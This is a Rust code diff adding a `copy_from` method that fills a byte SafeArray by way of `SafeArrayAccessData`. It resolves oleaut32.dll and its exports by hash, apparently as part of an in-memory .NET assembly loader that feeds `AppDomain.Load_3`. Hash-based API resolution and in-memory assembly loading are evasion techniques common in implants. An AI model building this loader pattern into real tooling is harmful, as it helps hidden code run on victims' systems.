@@ -47,6 +47,41 @@ impl OwnedSafeArray {
             if p.is_null() { None } else { Some(OwnedSafeArray { ptr: p }) }
         }
     }
+
+    /// Copy raw bytes into a `VT_UI1` array using `SafeArrayAccessData` /
+    /// `SafeArrayUnaccessData` (the documented API). Replaces direct
+    /// `(*ptr).pvData` reads which can fail `AppDomain.Load_3` with
+    /// `ERROR_BAD_FORMAT` on certain Windows builds.
+    pub unsafe fn copy_from(&self, src: &[u8]) -> bool {
+        unsafe {
+            let oleaut = match resolve_module(hash!("oleaut32.dll")) {
+                Some(m) => m,
+                None => return false,
+            };
+            let access = match resolve_export(oleaut, hash!("SafeArrayAccessData")) {
+                Some(f) => f,
+                None => return false,
+            };
+            let unaccess = match resolve_export(oleaut, hash!("SafeArrayUnaccessData")) {
+                Some(f) => f,
+                None => return false,
+            };
+            type AccessFn =
+                unsafe extern "system" fn(*mut SafeArray, *mut *mut c_void) -> i32;
+            type UnaccessFn = unsafe extern "system" fn(*mut SafeArray) -> i32;
+            let access_f: AccessFn = core::mem::transmute(access);
+            let unaccess_f: UnaccessFn = core::mem::transmute(unaccess);
+
+            let mut pv: *mut c_void = core::ptr::null_mut();
+            let hr = access_f(self.ptr, &mut pv);
+            if hr < 0 || pv.is_null() {
+                return false;
+            }
+            core::ptr::copy_nonoverlapping(src.as_ptr(), pv as *mut u8, src.len());
+            let _ = unaccess_f(self.ptr);
+            true
+        }
+    }
 }
 
 impl Drop for OwnedSafeArray {
